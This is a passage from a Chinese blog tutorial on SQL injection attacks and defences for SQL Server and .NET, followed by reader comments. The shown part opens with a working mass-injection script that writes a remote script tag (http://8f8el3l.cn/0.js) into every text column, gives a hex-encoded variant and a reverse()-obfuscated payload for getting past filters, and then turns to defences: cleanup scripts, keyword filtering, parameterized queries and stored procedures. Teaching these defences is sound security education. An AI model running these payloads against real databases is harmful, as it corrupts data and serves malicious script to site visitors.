`From` `SysobjectsA,Syscolumns B` `Where` `A.Id=B.Id` `And` ` A.Xtype=``'u' ` `And` `(B.Xtype=99` `Or` `B.Xtype=35` `Or` `B.Xtype=231` `Or` `B.Xtype=167)`

`Open` `Table_Cursor`

`Fetch` `Next` `From`  `Table_Cursor` `Into` `@T,@C`

`While(@@Fetch_Status=0)`

`Begin`

` Exec``(``'update ['``+@T+``'] Set ['``+@C+``']=Rtrim(Convert(Varchar(8000),['``+@C+``']))+'``'<script src=[http://8f8el3l.cn/0.js></script](http://8f8el3l.cn/0.js></script)>'``''``) `

`Fetch` `Next` `From` `Table_Cursor` `Into` `@T,@C`

`End`

`Close` `Table_Cursor`

`DeallocateTable_Cursor`

b) 更高级的攻击，将上面的注入 SQL 进行“HEX 编码”，从而避免程序的关键字检查、脚本转义等，通过 EXEC 执行

[?](# "?")

1

2

`dEcLaRe` `@s` ` vArChAr``(8000) ` `sEt` `@s=0x4465636c617265204054205661726368617228323535292c4043205661726368617228323535290d0a4465636c617265205461626c655f437572736f7220437572736f7220466f722053656c65637420412e4e616d652c422e4e616d652046726f6d205379736f626a6563747320412c537973636f6c756d6e73204220576865726520412e49643d422e496420416e6420412e58747970653d27752720416e642028422e58747970653d3939204f7220422e58747970653d3335204f7220422e58747970653d323331204f7220422e58747970653d31363729204f70656e205461626c655f437572736f72204665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c4043205768696c6528404046657463685f5374617475733d302920426567696e20457865632827757064617465205b272b40542b275d20536574205b272b40432b275d3d527472696d28436f6e7665727428566172636861722838303030292c5b272b40432b275d29292b27273c736372697074207372633d687474703a2f2f386638656c336c2e636e2f302e6a733e3c2f7363726970743e272727294665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c404320456e6420436c6f7365205461626c655f437572736f72204465616c6c6f63617465205461626c655f437572736f72;`

` eXeC``(@s);``-- `

c) 批次删除数据库被注入的脚本

[?](# "?")

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

34

35

36

37

38

39

40

41

42

43

44

`declare` `@delStrnvarchar(500)`

`set` ` @delStr=``'<script src=[http://8f8el3l.cn/0.js></script](http://8f8el3l.cn/0.js></script)>' ` `--要被替换掉字符`

`setnocount` `on`

`declare` `@tableNamenvarchar(100),@columnNamenvarchar(100),@tbIDint,@iRowint,@iResultint`

`declare` `@sqlnvarchar(500)`

`set` `@iResult=0`

`declare` `cur` `cursor` `for`

`selectname,id` `from` `sysobjects` `where` ` xtype=``'U' `

`open` `cur`

`fetch` `next` `from` `cur` `into` `@tableName,@tbID`

`while @@fetch_status=0`

`begin`

`declare` `cur1` `cursor` `for`

`--xtype in (231,167,239,175) 为char,varchar,nchar,nvarchar类型`

`select` `name` `from` `syscolumns` `where` `xtype` `in` `(231,167,239,175)` `and` `id=@tbID`

`open` `cur1`

`fetch` `next` `from` `cur1` `into` `@columnName`

`while @@fetch_status=0`

`begin`

`set` ` @sql=``'update [' ` `+ @tableName +` ` '] set ['``+ @columnName +``']= replace(['``+@columnName+``'],'``''``+@delStr+``''``','``''``') where ['``+@columnName+``'] like '``'%'``+@delStr+``'%'``'' `

`execsp_executesql @sql`

`set` `@iRow=@@rowcount`

`set` `@iResult=@iResult+@iRow`

`if @iRow>0`

`begin`

`print` ` '表：'``+@tableName+``',列:'``+@columnName+``'被更新'``+``convert``(``varchar``(10),@iRow)+``'条记录;' `

`end`

`fetch` `next` `from` `cur1` `into` `@columnName`

`end`

`close` `cur1`

`deallocate` `cur1`

`fetch` `next` `from` `cur` `into` `@tableName,@tbID`

`end`

`print` ` '数据库共有'``+``convert``(``varchar``(10),@iResult)+``'条记录被更新!!!' `

`close` `cur`

`deallocate` `cur`

`setnocount` `off`

d) 我如何得到“HEX 编码”？

开始不知道 HEX 是什么东西，后面查了是“十六进制”，网上已经给出两种转换方式：（注意转换的时候不要加入十六进制的标示符 ’0x’ ）

Ø [在线转换 （TRANSLATOR, BINARY），进入……](http://home.paulschou.net/tools/xlate/)

Ø [C#版的转换，进入……](http://hi.baidu.com/bopdawpdarbenxq/item/4be36d83d7937356e63d19c5)

9. 对于敏感词过滤不到位的检查，我们可以结合函数构造 SQL 注入

比如过滤了 update，却没有过滤 declare、exec 等关键词，我们可以使用 reverse 来将倒序的 sql 进行注入：

[?](# "?")

1

`declare` `@A` ` varchar``(200);``set ` ` @A=reverse(``''``'58803303431'``'=emanresu erehw '``'9d4d9c1ac9814f08'``'=drowssaP tes xxx tadpu'``); `

防止 SQL 注入

1. 数据库权限控制，只给访问数据库的 web 应用功能所需的最低权限帐户。

如 MSSQL 中一共存在 8 种权限：sysadmin, dbcreator, diskadmin, processadmin, serveradmin, setupadmin, securityadmin, bulkadmin。

2. 自定义错误信息，首先我们要屏蔽服务器的详细错误信息传到客户端。

在 ASP.NET 中，可通过 web.config 配置文件的<customErrors>节点设置：

[?](# "?")

1

2

3

` <``customErrors ` `defaultRedirect="url" mode="On|Off|RemoteOnly">`

` <``error. ` `. ./>`

` </``customErrors``> `

[更详细，请进入……](<http://msdn.microsoft.com/zh-cn/library/h0hfz6fc(v=vs.80).aspx>)

mode：指定是启用或禁用自定义错误，还是仅向远程客户端显示自定义错误。

On

指定启用自定义错误。如果未指定 defaultRedirect，用户将看到一般性错误。

Off

指定禁用自定义错误。这允许显示标准的详细错误。

RemoteOnly

指定仅向远程客户端显示自定义错误并且向本地主机显示 ASP.NET 错误。这是默认值。

看下效果图：

设置为<customErrors mode="On">一般性错误：

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922155916.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922122276.png)

设置为<customErrors mode="Off">：

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922238089.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922188617.png)

3. 把危险的和不必要的存储过程删除

xp\_：扩展存储过程的前缀，SQL 注入攻击得手之后，攻击者往往会通过执行 xp_cmdshell 之类的扩展存储过程，获取系统信息，甚至控制、破坏系统。

xp_cmdshell

能执行 dos 命令，通过语句 sp_dropextendedproc 删除，

不过依然可以通过 sp_addextendedproc 来恢复，因此最好删除或改名 xplog70.dll（sql server 2000、windows7）

xpsql70.dll(sqlserer 7.0)

xp_fileexist

用来确定一个文件是否存在

xp_getfiledetails

可以获得文件详细资料

xp_dirtree

可以展开你需要了解的目录，获得所有目录深度

Xp_getnetname

可以获得服务器名称

Xp_regaddmultistring

Xp_regdeletekey

Xp_regdeletevalue

Xp_regenumvalues

Xp_regread

Xp_regremovemultistring

Xp_regwrite

可以访问注册表的存储过程

Sp_OACreate

Sp_OADestroy

Sp_OAGetErrorInfo

Sp_OAGetProperty

Sp_OAMethod

Sp_OASetProperty

Sp_OAStop

如果你不需要请丢弃 OLE 自动存储过程

4. 非参数化 SQL 与参数化 SQL

1) 非参数化（动态拼接 SQL）

a) 检查客户端脚本：若使用.net，直接用 System.Net.WebUtility.HtmlEncode(string)将输入值中包含的[《HTML 特殊转义字符》](http://www.cnblogs.com/rpoplar/archive/2012/08/03/2621409.html)转换掉。

b) 类型检查：对接收数据有明确要求的，在方法内进行类型验证。如数值型用 int.TryParse()，日期型用 DateTime.TryParse() ，只能用英文或数字等。

c) 长度验证：要进行必要的注入，其语句也是有长度的。所以如果你原本只允许输入 10 字符，那么严格控制 10 个字符长度，一些注入语句就没办法进行。

d) 使用枚举：如果只有有限的几个值，就用枚举。

e) 关键字过滤：这个门槛比较高，因为各个数据库存在关键字，内置函数的差异，所以对编写此函数的功底要求较高。如公司或个人有积累一个比较好的通用过滤函数还请留言分享下，学习学习，谢谢！

这边提供一个关键字过滤参考方案(MSSQL)：

[?](# "?")

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

`public` `static` `bool` ` ValiParms(``string ` `parms)`

`{`

`if` `(parms ==` ` null``) `

`{`

`return` ` false``; `

`}`

`Regex regex =` `new` ` Regex(``"sp_"``, RegexOptions.IgnoreCase); `

`Regex regex2 =` `new` ` Regex(``"'"``, RegexOptions.IgnoreCase); `

`Regex regex3 =` `new` ` Regex(``"create "``, RegexOptions.IgnoreCase); `

`Regex regex4 =` `new` ` Regex(``"drop "``, RegexOptions.IgnoreCase); `

`Regex regex5 =` `new` ` Regex(``"\""``, RegexOptions.IgnoreCase); `

`Regex regex6 =` `new` ` Regex(``"exec "``, RegexOptions.IgnoreCase); `

`Regex regex7 =` `new` ` Regex(``"xp_"``, RegexOptions.IgnoreCase); `

`Regex regex8 =` `new` ` Regex(``"insert "``, RegexOptions.IgnoreCase); `

`Regex regex9 =` `new` ` Regex(``"delete "``, RegexOptions.IgnoreCase); `

`Regex regex10 =` `new` ` Regex(``"select "``, RegexOptions.IgnoreCase); `

`Regex regex11 =` `new` ` Regex(``"update "``, RegexOptions.IgnoreCase); `

`return` `(regex.IsMatch(parms) || (regex2.IsMatch(parms) || (regex3.IsMatch(parms) || (regex4.IsMatch(parms) || (regex5.IsMatch(parms) || (regex6.IsMatch(parms) || (regex7.IsMatch(parms) || (regex8.IsMatch(parms) || (regex9.IsMatch(parms) || (regex10.IsMatch(parms) || (regex11.IsMatch(parms))))))))))));`

`}`

优点：写法相对简单，网络传输量相对参数化拼接 SQL 小

缺点：

a) 对于关键字过滤，常常“顾此失彼”，如漏掉关键字，系统函数，对于 HEX 编码的 SQL 语句没办法识别等等，并且需要针对各个数据库封装函数。

b) 无法满足需求：用户本来就想发表包含这些过滤字符的数据。

c) 执行拼接的 SQL 浪费大量缓存空间来存储只用一次的查询计划。服务器的物理内存有限，SQLServer 的缓存空间也有限。有限的空间应该被充分利用。

2. 参数化查询（Parameterized Query）

a) 检查客户端脚本，类型检查，长度验证，使用枚举，明确的关键字过滤这些操作也是需要的。他们能尽早检查出数据的有效性。

b) 参数化查询原理：在使用参数化查询的情况下，数据库服务器不会将参数的内容视为 SQL 指令的一部份来处理，而是在数据库完成 SQL 指令的编译后，才套用参数运行，因此就算参数中含有具有损的指令，也不会被数据库所运行。

c) 所以在实际开发中，入口处的安全检查是必要的，参数化查询应作为最后一道安全防线。

优点：

Ø 防止 SQL 注入(使单引号、分号、注释符、xp\_扩展函数、拼接 SQL 语句、EXEC、SELECT、UPDATE、DELETE 等 SQL 指令无效化)

Ø 参数化查询能强制执行类型和长度检查。

Ø 在 MSSQL 中生成并重用查询计划，从而提高查询效率（执行一条 SQL 语句，其生成查询计划将消耗大于 50%的时间）

缺点：

Ø 不是所有数据库都支持参数化查询。目前 Access、SQL Server、MySQL、SQLite、Oracle 等常用数据库支持参数化查询。

疑问：参数化如何“批量更新”数据库。

a) 通过在参数名上增加一个计数来区分开多个参数化语句拼接中的同名参数。

EG：

[?](# "?")

1

2

3

4

5

6

7

8

9

` StringBuilder sqlBuilder=``new ` `StringBuilder(512);`

`Int count=0;`

`For(循环)`

`{`

`sqlBuilder.AppendFormat(“UPDATE login SET password=@password{0} WHERE username=@userName{0}”,count.ToString());`

` SqlParameter para=``new ` `SqlParamter(){ParameterName=@password+count.ToString()}`

`……`

`Count++;`

`}`

b) 通过 MSSQL 2008 的新特性：表值参数，将 C#中的整个表当参数传递给存储过程，由 SQL 做逻辑处理。注意 C#中参数设置 parameter.SqlDbType = System.Data.SqlDbType.Structured;  [详细请查看……](http://www.codeproject.com/Articles/39161/C-and-Table-Value-Parameters)

疑虑：有部份的开发人员可能会认为使用参数化查询，会让程序更不好维护，或者在实现部份功能上会非常不便，然而，使用参数化查询造成的额外开发成本，通常都远低于因为 SQL 注入攻击漏洞被发现而遭受攻击，所造成的重大损失。

另外：想验证重用查询计划的同学，可以使用下面两段辅助语法

[?](# "?")

1

2

3

4

5

6

7

8

9

`--清空缓存的查询计划`

`DBCC FREEPROCCACHE`

`GO`

`--查询缓存的查询计划`

`SELECT` `stats.execution_count` `AS` `cnt, p.size_in_bytes` `AS` ` [``size``], [sql].[text] ` `AS` `[plan_text]`

`FROM` `sys.dm_exec_cached_plans p`

`OUTER` `APPLY sys.dm_exec_sql_text (p.plan_handle) sql`

`JOIN` `sys.dm_exec_query_stats stats` `ON` `stats.plan_handle = p.plan_handle`

`GO`

3. 参数化查询示例

效果如图：

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922275184.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922251795.png)

参数化关键代码：

[?](# "?")

1

2

3

4

5

6

7

8

9

10

11

`Private` `bool` ` ProtectLogin(``string ` `userName,` `string` `password)`

`{`

`SqlParameter[] parameters =` `new` `SqlParameter[]`

`{`

`new` ` SqlParameter{ParameterName=``"@UserName"``,SqlDbType=SqlDbType.NVarChar,Size=10,Value=userName}, `

`new` ` SqlParameter{ParameterName=``"@Password"``,SqlDbType=SqlDbType.VarChar,Size=20,Value=password} `

`};`

`int` ` count = (``int``)SqlHelper.Instance.ExecuteScalar `

` (``"SELECT COUNT(*) FROM Login WHERE UserName=@UserName AND Password=@password"``, parameters); `

`return` `count > 0 ?` `true` `:` ` false``; `

`}`

5. 存储过程

存储过程（Stored Procedure）是在大型数据库系统中，一组为了完成特定功能的 SQL 语句集，经编译后存储在数据库中，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。

优点：

a) 安全性高，防止 SQL 注入并且可设定只有某些用户才能使用指定存储过程。

b) 在创建时进行预编译，后续的调用不需再重新编译。

c) 可以降低网络的通信量。存储过程方案中用传递存储过程名来代替 SQL 语句。

缺点：

a) 非应用程序内联代码，调式麻烦。

b) 修改麻烦，因为要不断的切换开发工具。（不过也有好的一面，一些易变动的规则做到存储过程中，如变动就不需要重新编译应用程序）

c) 如果在一个程序系统中大量的使用存储过程，到程序交付使用的时候随着用户需求的增加会导致数据结构的变化，接着就是系统的相关问题了，最后如果用户想维护该系统可以说是很难很难（eg：没有 VS 的查询功能）。

演示请下载示例程序，关键代码为：

[?](# "?")

1

2

`cmd.CommandText = procName;` `// 传递存储过程名`

`cmd.CommandType = CommandType.StoredProcedure;` `// 标识解析为存储过程`

如果在存储过程中 SQL 语法很复杂需要根据逻辑进行拼接，这时是否还具有放注入的功能？

答：MSSQL 中可以通过 EXEC 和 sp_executesql 动态执行拼接的 sql 语句，但 sp_executesql 支持替换 Transact-SQL 字符串中指定的任何参数值， EXECUTE 语句不支持。所以只有使用 sp_executesql 方式才能启到参数化防止 SQL 注入。

关键代码：（详细见示例）

a) sp_executesql

[?](# "?")

1

2

3

4

5

6

7

8

9

10

11

`CREATE` `PROCEDURE` `PROC_Login_executesql(`

`@userNamenvarchar(10),`

` @``password ` `nvarchar(10),`

` @``count ` `int` `OUTPUT`

`)`

`AS`

`BEGIN`

`DECLARE` `@s nvarchar(1000);`

`set` ` @s=N``'SELECT @count=COUNT(*) FROM Login WHERE UserName=@userName AND Password=@password'``; `

`EXEC` ` sp_executesql @s,N``'@userName nvarchar(10),@password nvarchar(10),@count int output'``,@userName=@userName,@``password``=@``password``,@``count``=@``count ` `output`

`END`

b) EXECUTE（注意 sql 中拼接字符，对于字符参数需要额外包一层单引号，需要输入两个单引号来标识 sql 中的一个单引号）

[?](# "?")

1

2

3

4

5

6

7

8

9

10

`CREATE` `PROCEDURE` `PROC_Login_EXEC(`

`@userNamenvarchar(10),`

` @``password ` ` varchar``(20) `

`)`

`AS`

`BEGIN`

`DECLARE` `@s nvarchar(1000);`

`set` ` @s=``'SELECT @count=COUNT(*) FROM Login WHERE UserName='``''``+``CAST``(@userName ` `AS` ` NVARCHAR(10))+``''``' AND Password='``''``+``CAST``(@``password ` `AS` ` VARCHAR``(20))+``''``''``; `

` EXEC``(``'DECLARE @count int;' ` ` +@s+``'select @count'``); `

`END`

注入截图如下：

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922302346.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922292478.png)

6. 专业的 SQL 注入工具及防毒软件

情景 1

A：“丫的，又中毒了……”

B：“我看看，你这不是裸机在跑吗？”

电脑上至少也要装一款杀毒软件或木马扫描软件，这样可以避免一些常见的侵入。比如开篇提到的 SQL 创建 windows 帐户，就会立马报出警报。

情景 2

A：“终于把网站做好了，太完美了，已经检查过没有漏洞了！”

A：“网站怎么被黑了，怎么入侵的？？？”

公司或个人有财力的话还是有必要购买一款专业 SQL 注入工具来验证下自己的网站，这些工具毕竟是专业的安全人员研发，在安全领域都有自己的独到之处。SQL 注入工具介绍：[10 个 SQL 注入工具](http://blog.jobbole.com/17763/)

7. 额外小知识：LIKE 中的通配符

尽管这个不属于 SQL 注入，但是其被恶意使用的方式是和 SQL 注入类似的。

参考：[SQL 中通配符的使用](http://losegoat.blog.163.com/blog/static/1822557200852111915785/)

%

包含零个或多个字符的任意字符串。

\_

任何单个字符。

\[\]

指定范围（例如 \[a-f\]）或集合（例如 \[abcdef\]）内的任何单个字符。

\[^\]

不在指定范围（例如 \[^a - f\]）或集合（例如 \[^abcdef\]）内的任何单个字符。

在模糊查询 LIKE 中，对于输入数据中的通配符必须转义，否则会造成客户想查询包含这些特殊字符的数据时，这些特殊字符却被解析为通配符。不与 LIKE 一同使用的通配符将解释为常量而非模式。

**注意使用通配符的索引性能问题：**

a) like 的第一个字符是'%'或'\_'时，为未知字符不会使用索引, sql 会遍历全表。

b) 若通配符放在已知字符后面，会使用索引。

网上有这样的说法，不过我在 MSSQL 中使用 ctrl+L 执行语法查看索引使用情况却都没有使用索引，可能在别的数据库中会使用到索引吧……

截图如下：

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922338669.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922313294.png)

有两种将通配符转义为普通字符的方法：

1. 使用 ESCAPE 关键字定义转义符（通用）

在模式中，当转义符置于通配符之前时，该通配符就解释为普通字符。例如，要搜索在任意位置包含字符串 5% 的字符串，请使用：

WHERE ColumnA LIKE '%5/%%' ESCAPE '/'

2. 在方括号 (\[ \]) 中只包含通配符本身，或要搜索破折号 (-) 而不是用它指定搜索范围，请将破折号指定为方括号内的第一个字符。EG：

符号

含义

LIKE '5\[%\]'

5%

LIKE '5%'

5 后跟 0 个或多个字符的字符串

LIKE '\[\_\]n'

\_n

LIKE '\_n'

an, in, on (and so on)

LIKE '\[a-cdf\]'

a、b、c、d 或 f

LIKE '\[-acdf\]'

-、a、c、d 或 f

LIKE '\[ \[ \]'

\[

LIKE '\]'

\] （右括号不需要转义）

所以，进行过输入参数的关键字过滤后，还需要做下面转换确保 LIKE 的正确执行

[?](# "?")

1

2

3

4

5

6

7

`private` `static` `string` ` ConvertSqlForLike(``string ` `sql)`

`{`

` sql = sql.Replace(``"["``, ` ` "[[]"``); ` `// 这句话一定要在下面两个语句之前，否则作为转义符的方括号会被当作数据被再次处理`

` sql = sql.Replace(``"_"``, ` ` "[_]"``); `

` sql = sql.Replace(``"%"``, ` ` "[%]"``); `

`return` `sql;`

`}`

结束语：感谢你耐心的观看。恭喜你， SQL 安全攻防你已经入门了……

参考文献：

[SQL 注入天书](http://wenku.baidu.com/view/dc6b95660b1c59eef8c7b449.html)

[(百度百科)SQL 注入](http://baike.baidu.com/view/3896.htm)

扩展资料：

[Sql Server 编译、重编译与执行计划重用原理](http://blog.csdn.net/babauyang/article/details/7714211)

[浅析 Sql Server 参数化查询](http://www.cnblogs.com/lzrabbit/archive/2012/04/21/2460978.html)\-\-\-\-\-验证了参数的类型和长度对参数化查询影响

[Sql Server 参数化查询之**where in**和 like 实现详解](http://wenku.baidu.com/view/9f19df7701f69e3143329421.html)

\-\-\-\-\-讲述 6 种参数化实现方案

[webshell](http://baike.baidu.com/view/53110.htm) \-\-\-\-\-不当小白，你必须认识的专业术语。一个用于站长管理，入侵者入侵的好工具

[SQL 注入技术和跨站脚本攻击的检测](http://www.searchsecurity.com.cn/showcontent_2544.htm) \-\-\-\-\-讲解使用正则表达式检测注入

[XSS(百度百科)](http://baike.baidu.com/view/50325.htm)              -------恶意攻击者往 Web 页面里插入恶意 html 代码，当用户浏览该页之时，嵌入其中 Web 里面的 html 代码会被执行，从而达到恶意用户的特殊目的。

[XSS 攻击实例](http://news.cnblogs.com/n/106793/)                -------基本思路：我们都知道网上很多网站都可以“记住你的用户名和密码”或是“自动登录”，其实是在你的本地设置了一个 cookie，这种方式可以让你免去每次都输入用户名和口令的痛苦，但是也带来很大的问题。试想，如果某用户在“自动登录”的状态下，如果你运行了一个程序，这个程序访问“自动登录”这个网站上一些链接、提交一些表单，那么，也就意味着这些程序不需要输入用户名和口令的手动交互就可以和服务器上的程序通话。

[Web 安全测试之 XSS](http://www.cnblogs.com/TankXiao/archive/2012/03/21/2337194.html)

[Web API 入门指南 - 闲话安全  ](http://www.cnblogs.com/developersupport/p/WebAPI-Security.html)

[中间人攻击(MITM)姿势总结](http://www.cnblogs.com/LittleHann/p/3735602.html)

[浅谈 WEB 安全性（前端向）](http://www.cnblogs.com/vajoy/p/4176908.html)

作者：[滴答的雨](http://www.cnblogs.com/heyuquan/)  
出处：[http://www.cnblogs.com/heyuquan/](http://www.cnblogs.com/heyuquan/)  
本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留追究法律责任的权利。

欢迎园友讨论下自己的见解，及向我推荐更好的资料。  
本文如对您有帮助，还请多帮 **【推荐】** 下此文。  
谢谢！！！  (_^\_^_)  
技术群：185718116（广深莞·NET 技术），欢迎你的加入  
技术群：[![广西IT技术交流](http://pub.idqqimg.com/wpa/images/group.png "广西IT技术交流")](http://shang.qq.com/wpa/qunwpa?idkey=bedc1077396d17ebbb84f29e7704a63fb3da35c3b6902e537e6cf2283ccbb6d3)（广西 IT 技术交流），欢迎你的加入

分类: [安全设计](https://www.cnblogs.com/heyuquan/category/368749.html), [架构设计](https://www.cnblogs.com/heyuquan/category/1378386.html), [数据库](https://www.cnblogs.com/heyuquan/category/1378402.html)

[好文要顶](<javascript:void(0);>) [关注我](<javascript:void(0);>) [收藏该文](<javascript:void(0);>) [![](https://common.cnblogs.com/images/icon_weibo_24.png)](<javascript:void(0);> "分享至新浪微博") [![](https://common.cnblogs.com/images/wechat.png)](<javascript:void(0);> "分享至微信")

[![](https://pic.cnblogs.com/face/u106337.jpg?id=13140010)](https://home.cnblogs.com/u/heyuquan/)

[滴答的雨](https://home.cnblogs.com/u/heyuquan/)  
[关注 \- 78](https://home.cnblogs.com/u/heyuquan/followees/)  
[粉丝 \- 2323](https://home.cnblogs.com/u/heyuquan/followers/)

推荐博客

[+加关注](<javascript:void(0);>)

[关注 【滴答的雨】](<javascript:void(0);>)

257

1

[快速评论](<javascript:void(0);>)     [返回顶部](#top)

currentDiggType = 0;

[«](https://www.cnblogs.com/heyuquan/archive/2012/09/28/2707632.html) 上一篇： [博客美化：通用代码高亮插件（SyntaxHighlighter）](https://www.cnblogs.com/heyuquan/archive/2012/09/28/2707632.html "发布于 2012-09-28 18:52")  
[»](https://www.cnblogs.com/heyuquan/archive/2012/11/30/async-and-await-faq.html) 下一篇： [（译）关于 async 与 await 的 FAQ](https://www.cnblogs.com/heyuquan/archive/2012/11/30/async-and-await-faq.html "发布于 2012-11-30 11:04")

posted on 2012-10-31 19:38 [滴答的雨](https://www.cnblogs.com/heyuquan/) 阅读(140428) 评论(212) [编辑](https://i.cnblogs.com/EditPosts.aspx?postid=2748577) [收藏](<javascript:void(0)>)

markdown_highlight(); var allowComments = true, cb_blogId = 113108, cb_blogApp = 'heyuquan', cb_blogUserGuid = '7c8a509c-abf3-de11-ba8f-001cf0cd104b'; var cb_entryId = 2748577, cb_entryCreatedDate = '2012-10-31 19:38', cb_postType = 1; loadViewCount(cb_entryId);

[< Prev](#!comments) [1](#!comments) [2](#!comments) [3](#!comments) [4](#!comments) 5

**评论:**

[#201 楼](#3347124) 2016-01-13 18:01 | [venices](https://www.cnblogs.com/venice/)

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

不错，值得学习

[支持(0)](<javascript:void(0);>) [反对(0)](<javascript:void(0);>)

[#202 楼](#3366427) 2016-02-25 09:02 | [RyanLe](https://home.cnblogs.com/u/897726/)

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

楼主，你好，才开始涉及安全，请问下您这里有没有注入工具可供下载。

[支持(0)](<javascript:void(0);>) [反对(0)](<javascript:void(0);>)

[#203 楼](#3415676) 2016-04-22 21:19 | [心云 linda](https://www.cnblogs.com/ITLearner-Linda/)

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

请问这里  
a) 猜测数据库名： and db_name() >0 或系统表 master.dbo.sysdatabases  
是怎么用 master.dbo.sysdatabases 猜数据库名的？

[支持(0)](<javascript:void(0);>) [反对(0)](<javascript:void(0);>)

[#204 楼](#3470311) 2016-07-14 20:38 | [ppassion](https://home.cnblogs.com/u/992638/)

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

博主大大你好，源码中是不包含数据库的吗，好像程序不能运行

[支持(0)](<javascript:void(0);>) [反对(0)](<javascript:void(0);>)

[#205 楼](#3499002) 2016-08-29 17:58 | [一百零七个](https://www.cnblogs.com/zzry/)

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

mark!

[支持(0)](<javascript:void(0);>) [反对(0)](<javascript:void(0);>)

https://pic.cnblogs.com/face/983981/20160629093639.png

[#206 楼](#3527913) 2016-10-11 10:35 | [吴某 1](https://www.cnblogs.com/webster1/)

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

666

[支持(0)](<javascript:void(0);>) [反对(0)](<javascript:void(0);>)

https://pic.cnblogs.com/face/723162/20150212174325.png

[#207 楼](#3535869) 2016-10-19 14:45 | [浮生若梦丶丨](https://home.cnblogs.com/u/896034/)

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

666666

[支持(0)](<javascript:void(0);>) [反对(0)](<javascript:void(0);>)

[#208 楼](#3561995) 2016-11-22 11:01 | [jianiu](https://www.cnblogs.com/mingjia/)

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

mark

[支持(0)](<javascript:void(0);>) [反对(0)](<javascript:void(0);>)

[#209 楼](#3790634) 2017-09-20 11:15 | [浮生若梦丶丨](https://www.cnblogs.com/sanfor/)

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

6666

[支持(0)](<javascript:void(0);>) [反对(0)](<javascript:void(0);>)

https://pic.cnblogs.com/face/896034/20170905135439.png

[#210 楼](#3803494) 2017-10-06 15:32 | [成长记实录](https://home.cnblogs.com/u/1252222/)

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

点错了 抱歉 手贱我

[支持(0)](<javascript:void(0);>) [反对(0)](<javascript:void(0);>)

[#211 楼](#3803495) 2017-10-06 15:32 | [成长记实录](https://home.cnblogs.com/u/1252222/)

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

mark

[支持(0)](<javascript:void(0);>) [反对(0)](<javascript:void(0);>)

[#212 楼](#3905324) 3905324 2018/2/7 上午 10:55:59 2018-02-07 10:55 | [暗夜苹果](https://www.cnblogs.com/dahuo/)

![](https://www.cnblogs.com/images/cnblogs_com/heyuquan/406488/t_op.png)

mark

[支持(0)](<javascript:void(0);>) [反对(0)](<javascript:void(0);>)

[< Prev](#!comments) [1](#!comments) [2](#!comments) [3](#!comments) [4](#!comments) 5

var commentManager = new blogCommentManager(); commentManager.renderComments(0);

[刷新评论](<javascript:void(0);>)[刷新页面](#)[返回顶部](#top)

注册用户登录后才能发表评论，请 [登录](<javascript:void(0);>) 或 [注册](<javascript:void(0);>)， [访问](https://www.cnblogs.com/) 网站首页。

[【推荐】超 50 万行 VC++源码: 大型组态工控、电力仿真 CAD 与 GIS 源码库](http://www.ucancode.com/index.htm)  
[【活动】京东云限时优惠 1.5 折购云主机，最高返价值 1000 元礼品！](https://www.jdcloud.com/cn/activity/newUser?utm_source=DMT_cnblogs&utm_medium=CH&utm_campaign=09vm&utm_term=Virtual-Machines)  
[【推荐】腾讯云海外云服务器 1 核 2G19.8 元/月](https://cloud.tencent.com/act/pro/overseas?fromSource=gwzcw.2802159.2802159.2802159&utm_medium=cpc&utm_id=gwzcw.2802159.2802159.2802159)  
[【推荐】919 天翼云钜惠，全网低价，云主机 9 元轻松购](https://www.ctyun.cn/activity/#/20190919?hmsr=%E5%8D%9A%E5%AE%A2%E5%9B%AD-0916-919%E6%B4%BB%E5%8A%A8&hmpl=&hmcu=&hmkw=&hmci=)  
[【推荐】华为云文字识别资源包重磅上市，1 元万次限时抢购](http://clickc.admaster.com.cn/c/a131575,b3595121,c1705,i0,m101,8a1,8b3,h)  
[【福利】git pull && cherry-pick 博客园&华为云百万代金券](https://www.cnblogs.com/cmt/p/11505603.html)

var googletag = googletag || {}; googletag.cmd = googletag.cmd || \[\]; googletag.cmd.push(function () { googletag.defineSlot("/1090369/C1", \[300, 250\], "div-gpt-ad-1546353474406-0").addService(googletag.pubads()); googletag.defineSlot("/1090369/C2", \[468, 60\], "div-gpt-ad-1539008685004-0").addService(googletag.pubads()); googletag.pubads().enableSingleRequest(); googletag.enableServices(); });

**相关博文：**  
· [SQL 注入攻防入门详解](https://www.cnblogs.com/caoyan/archive/2012/12/01/SQL注入攻防入门详解.html "SQL注入攻防入门详解")  
· [SQL 注入浅水攻防](https://www.cnblogs.com/jiangu66/p/3206821.html "SQL注入浅水攻防")  
· [SQL 注入攻防入门详解](https://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html "SQL注入攻防入门详解")  
